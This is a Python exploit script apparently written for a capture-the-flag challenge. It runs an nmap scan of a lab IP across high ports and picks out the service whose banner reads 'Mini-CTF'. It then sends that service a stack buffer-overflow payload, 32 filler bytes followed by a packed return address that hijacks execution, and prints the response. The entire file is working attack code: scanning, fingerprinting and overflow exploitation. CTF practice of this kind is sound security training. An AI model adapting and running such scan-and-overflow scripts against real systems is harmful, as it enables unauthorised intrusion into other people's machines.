import subprocess
import socket
from struct import pack

ctf_ip = "192.168.64.2"  # Replace with actual IP
offset = 32
hacked_addr = 0x0000000000000908  # Replace with runtime address if needed

def get_open_ports():
    print("[*] Running nmap scan...")
    try:
        result = subprocess.run(
            ["nmap", "-p", "1025-65535", "--open", ctf_ip, "-T4", "-Pn"],
            capture_output=True, text=True, check=True
        )
        ports = []
        for line in result.stdout.splitlines():
            if "/tcp" in line and "open" in line:
                port = int(line.split("/")[0])
                ports.append(port)
        print(f"[+] Found open ports: {ports}")
        return ports
    except subprocess.CalledProcessError as e:
        print("[-] Nmap scan failed:", e)
        return []

def test_banner(port):
    try:
        s = socket.create_connection((ctf_ip, port), timeout=1)
        banner = s.recv(64)
        s.close()
        return b"Mini-CTF" in banner
    except:
        return False

def send_payload(port):
    payload = b"A" * offset + pack("<Q", hacked_addr)
    try:
        s = socket.create_connection((ctf_ip, port), timeout=1)
        s.recv(1024)  # Read banner
        print(f"[+] Sending payload to port {port}...")
        s.sendall(payload)

        while True:
            data = s.recv(1024)
            if not data:
                break
            print(data.decode(errors="ignore"), end='')
        s.close()
    except Exception as e:
        print(f"[-] Exploit failed on port {port}: {e}")

def main():
    open_ports = get_open_ports()
    for port in open_ports:
        if test_banner(port):
            print(f"[+] Found Mini-CTF on port {port}")
            send_payload(port)
            return
    print("[-] Could not find target service.")

if __name__ == "__main__":
    main()
